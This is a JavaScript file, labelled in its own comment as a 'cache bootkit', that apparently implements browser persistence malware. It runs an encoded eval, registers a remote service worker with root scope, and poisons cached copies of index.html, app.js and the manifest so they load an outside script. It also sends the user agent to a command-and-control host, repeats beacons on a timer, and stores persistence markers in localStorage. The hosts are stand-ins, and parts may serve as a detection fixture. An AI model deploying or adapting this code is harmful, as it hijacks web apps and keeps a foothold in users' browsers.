// Cache bootkit persistence: registers a service worker, poisons the app shell
// and caches a malicious update, then persists a beacon and a version marker.
(function () {
  var C2 = 'https://c2.example.test/bootkit';
  var VERSION = '1337.0.0-evil';
  eval(atob('Y29uc29sZS5sb2coJ1tCT09US0lUXSBjYWNoZSBwZXJzaXN0ZW5jZSBtb2R1bGUgcmVhZHknKTs='));
  console.log('[BOOTKIT] arming', VERSION);

  function listCaches() {
    try {
      if (!window.caches || typeof window.caches.keys !== 'function') return;
      window.caches.keys().then(function (keys) {
        console.log('[BOOTKIT] caches', keys.join(','));
        keys.forEach(function (key) {
          if (key.indexOf('app-shell') === -1) return;
          window.caches.open(key).then(function (cache) { return cache.keys(); }).then(function (requests) {
            console.log('[BOOTKIT] cached requests', key, requests.length);
          }, function () {});
        });
      }, function () {});
    } catch (error) {}
  }

  function poison(name, url, body) {
    if (!window.caches || !window.caches.open) return;
    window.caches.open(name).then(function (cache) {
      var response = new Response(body, { headers: { 'content-type': 'text/html', 'x-bootkit': VERSION } });
      return cache.put(url, response);
    }).then(function () { console.log('[BOOTKIT] poisoned', name, url); }, function () {});
  }

  try {
    if (navigator.serviceWorker && navigator.serviceWorker.register) {
      navigator.serviceWorker.register('https://cdn.example.test/sw/bootkit.js', { scope: '/' })
        .then(function (registration) {
          if (registration && registration.update) registration.update();
          console.log('[BOOTKIT] registered', registration.scope);
        })
        .catch(function () { console.log('[BOOTKIT] registration blocked'); });
    }
  } catch (error) {}
  poison('app-shell-v1', '/index.html', '<script src="https://cdn.example.test/bootkit.js"></script>');
  poison('app-shell-v1', '/app.js', 'console.log("bootkit update");');
  poison('app-shell-v1', '/manifest.json', JSON.stringify({ name: 'bootkit', start_url: '/', version: VERSION }));
  poison('app-shell-v2', '/index.html', '<script src="https://cdn.example.test/bootkit.js?v=2"></script>');
  listCaches();
  try {
    if (navigator.serviceWorker && navigator.serviceWorker.addEventListener) {
      navigator.serviceWorker.addEventListener('message', function (event) {
        console.log('[BOOTKIT] worker message', Boolean(event.data));
      });
    }
  } catch (error) {}

  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ version: VERSION, ua: navigator.userAgent })) }).catch(function () {});
  } catch (error) {}
  try {
    localStorage.setItem('bootkit:version', VERSION);
    localStorage.setItem('bootkit:installed', String(Date.now()));
  } catch (error) {}
  var beats = 0;
  var failures = 0;
  var timer = setInterval(function () {
    beats += 1;
    try {
      fetch(C2 + '/heartbeat', { method: 'POST', body: btoa(JSON.stringify({ beats: beats, version: VERSION })) })
        .then(function (response) { if (!response.ok) failures += 1; }, function () { failures += 1; });
    } catch (error) { failures += 1; }
    try {
      localStorage.setItem('bootkit:heartbeat', JSON.stringify({ beats: beats, failures: failures, at: Date.now() }));
    } catch (error) {}
    console.log('[BOOTKIT] beacon', beats, 'failures', failures);
    if (beats >= 3) {
      clearInterval(timer);
      try { localStorage.setItem('bootkit:final', String(beats)); } catch (error) {}
    }
  }, 350);
  setTimeout(function () {
    try {
      var marker = document.createElement('meta');
      marker.name = 'bootkit-version';
      marker.content = VERSION;
      document.head.appendChild(marker);
    } catch (error) {}
  }, 700);
})();
